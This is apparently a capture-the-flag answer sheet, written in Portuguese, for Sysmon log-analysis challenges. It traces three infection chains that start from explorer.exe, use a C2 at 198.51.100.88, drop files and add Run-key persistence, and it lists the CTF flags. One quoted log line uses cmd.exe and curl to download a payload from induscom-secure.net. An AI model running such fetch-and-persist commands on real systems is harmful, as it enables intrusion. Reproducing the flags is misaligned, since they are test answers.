# Endpoint (Sysmon)

`sysmon_tn.jsonl`, `sysmon_lit.jsonl`, `sysmon_clm.jsonl` (as perguntas "LIT" apontam
o link errado sysmon_tn.jsonl mas o texto cita sysmon_lit.jsonl — usar esse).

Padrão: iniciado pelo explorer.exe -> conexão C2 198.51.100.88:80 -> arquivo dropado -> chave Run.
```bash
jq -c 'select((.Image//"")|test("update.bin"))' sysmon_tn.jsonl   # D:\update.bin
jq -c 'select(.ProcessGuid=="<guid>")' sysmon_tn.jsonl            # EventID 3/11/13 do mesmo processo
```

## TN-FIN-WS042 (sysmon_tn.jsonl)
update.bin: parent C:\Windows\explorer.exe · OriginalFileName ICG4200.exe · SHA256 d511...280b ·
Guid {B7E4C210-0812-2026-A1B2-0A320A2A} · ParentGuid {E0E0E0E0-...} · C2 198.51.100.88:80 ·
drop C:\Users\ops.cardoso\AppData\Local\IndusCom\update.bin ·
Run ...\Run\ObsidianUpdater · CampaignId **CTF{sysmon_tn_relay}**

## LIT-NMS-02 (sysmon_lit.jsonl)
explorer -> cmd.exe (`/c curl http://induscom-secure.net/litoral-dns -o dns-update.bin`) user LITORAL\carla.dias
Guid {C0D1C0D1-...} -> curl.exe (parent cmd.exe) · host induscom-secure.net/198.51.100.88 ·
drop C:\Users\Public\dns-update.bin · Run ...\Run\IndusComDNS · **CTF{sysmon_lit_relay}**

## CLM-MESA-014 (sysmon_clm.jsonl)
explorer -> mshta.exe clm-login.hta (CLM\marina.alves) -> clm-agent.bin (OriginalFileName CLMClient.exe) ·
host update.induscom-cdn.net · drop .../AppData/Local/IndusCom/clm-agent.bin ·
Run ...\Run\CLMClient · **CTF{sysmon_clm_relay}**
